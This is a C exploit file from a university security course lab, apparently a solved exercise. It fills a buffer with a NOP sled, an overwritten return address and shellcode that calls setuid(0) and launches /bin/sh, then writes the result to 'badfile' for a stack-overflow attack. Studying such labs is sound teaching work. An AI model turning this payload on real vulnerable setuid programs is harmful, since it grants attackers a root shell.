/* exploit.c */
/* A program that creates a file containing code for launching a shell. */
/* Modified by Tushar Jois for JHU 601.443/643, Security and Privacy. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
"\xb0\xd5" /* Line 3: movb $0xd5,%al */
"\xcd\x80" /* Line 4: int $0x80 */

"\x31\xc0" /* xorl %eax,%eax */
"\x50" /* pushl %eax */
"\x68""//sh" /* pushl $0x68732f2f */
"\x68""/bin" /* pushl $0x6e69622f */
"\x89\xe3" /* movl %esp,%ebx */
"\x50" /* pushl %eax */
"\x53" /* pushl %ebx */
"\x89\xe1" /* movl %esp,%ecx */
"\x99" /* cdq */
"\xb0\x0b" /* movb $0x0b,%al */
"\xcd\x80" /* int $0x80 */
;


/* You will not need to modify anything above this line. */
#define BUFLEN 65600
void main(int argc, char **argv)
{
char buffer[BUFLEN];
FILE *badfile;
/* You need to fill the buffer with appropriate contents here. */
/*fill with NOPs*/
memset(&buffer, 0x90, BUFLEN);

/*replacing the return address with the address of the buffer + 0x80 which is a NOP*/
*((long *)(buffer+114)) = 0xbffe66f8 + 0x80;
/*placing shellcode towards end of buffer*/
memcpy(buffer + BUFLEN - sizeof(shellcode), shellcode, sizeof(shellcode));

/* Save the contents to the file "badfile" */
badfile = fopen("./badfile", "w");
fwrite(buffer, BUFLEN, 1, badfile);
fclose(badfile);
}

